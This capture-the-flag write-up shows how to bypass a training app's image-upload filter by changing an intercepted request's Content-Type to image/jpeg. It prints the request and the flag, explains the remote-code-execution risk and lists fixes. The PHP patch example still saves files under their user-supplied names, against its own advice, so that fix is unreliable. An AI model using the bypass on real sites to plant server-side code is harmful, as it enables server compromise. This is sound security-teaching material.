# File Upload

On the page `http://192.168.56.2/?page=upload` we can upload a file. We can easily upload an jpeg image, but not another type of file. Using BurpSuite, let's try to bypass the type file restriction and upload a php file.

In burpSuite, in the proxy tab, set the intercept on. On the upload page, upload your php file and click on upload. You should see the request in BurpSuite.
```
POST /?page=upload HTTP/1.1
Host: 192.168.56.107
Content-Length: 448
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.56.107
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryh2tDr2S3Rp1yJgM3
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.56.107/?page=upload
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
Connection: close

------WebKitFormBoundaryh2tDr2S3Rp1yJgM3
Content-Disposition: form-data; name="MAX_FILE_SIZE"

100000
------WebKitFormBoundaryh2tDr2S3Rp1yJgM3
Content-Disposition: form-data; name="uploaded"; filename="test.php"
Content-Type: application/x-php
```

Change the content-type `application/x-php`  by `image/jpeg`. Forward the request (still in Burp) and you'll get the flag.


 **FLAG: 46910D9CE35B385885A9F7E2B336249D622F29B267A1771FBACF52133BEDDBA8**

## DESCRIPTION

The vulnerability you've described is a **File Upload Vulnerability**. Specifically, this instance involves **Content-Type Bypass**. This type of vulnerability occurs when the web application does not properly validate the file type being uploaded, allowing an attacker to upload malicious files by manipulating the `Content-Type` header.

### Explanation of the Vulnerability

1.  **File Upload Endpoint**: The application has an endpoint where users can upload files, presumably images.
2.  **Content-Type Manipulation**: The attacker uploads a file with a PHP payload but sets the `Content-Type` header to `image/jpeg`.
3.  **Improper Validation**: The server only checks the `Content-Type` header and accepts the file without performing a thorough validation to ensure it is actually a JPEG image.

### Potential Security Implications

1.  **Remote Code Execution (RCE)**: If the uploaded PHP file is executed by the server, the attacker can execute arbitrary code, leading to full server compromise.
2.  **Unauthorized Access**: The attacker can upload files that could help in further attacks, such as web shells or scripts that steal sensitive information.
3.  **Data Breach**: Malicious files could be used to access or modify sensitive data on the server.

## PATCH

### Preventive Measures

1.  **Content-Type Validation**: Do not rely solely on the `Content-Type` header for file validation, as it can be easily spoofed.
2.  **File Content Inspection**: Inspect the actual content of the file to verify it matches the expected format. This can be done using libraries or tools specific to the file type (e.g., GD or Imagick for images).
3.  **File Extension Check**: Ensure that the file extension matches the expected type (e.g., `.jpg` for JPEG images). However, this should not be the sole check, as it can also be bypassed.
4.  **Store Files Outside Web Root**: Store uploaded files outside the web root directory to prevent direct access and execution via the web server.
5.  **Renaming Files**: Rename uploaded files to a safe and predictable format, avoiding the use of user-supplied filenames.
6.  **Permission Settings**: Set appropriate permissions on uploaded files and directories to minimize the risk of code execution.
7.  **Use a Whitelist**: Use a whitelist of allowed file types and reject any file that does not match the allowed types.

### Example of File Content Inspection

Here’s a basic example in PHP that checks if the uploaded file is a valid JPEG image using the GD library:

```php
if (isset($_FILES['upload'])) {
    $file = $_FILES['upload']['tmp_name'];
    $fileInfo = getimagesize($file);

    if ($fileInfo && $fileInfo[2] === IMAGETYPE_JPEG) {
        // File is a valid JPEG image, proceed with upload
        move_uploaded_file($file, 'uploads/' . $_FILES['upload']['name']);
    } else {
        // Invalid file type
        echo "Invalid file type. Please upload a JPEG image.";
    }
}
```

## DOC

- [Burp Suite](https://portswigger.net/burp/documentation/desktop/getting-started)
- [File Upload Vulnerability](https://owasp.org/www-chapter-pune/meetups/2023/Jan/File-upload-Vulnerability-Praveen-Sutar.pptx.pdf)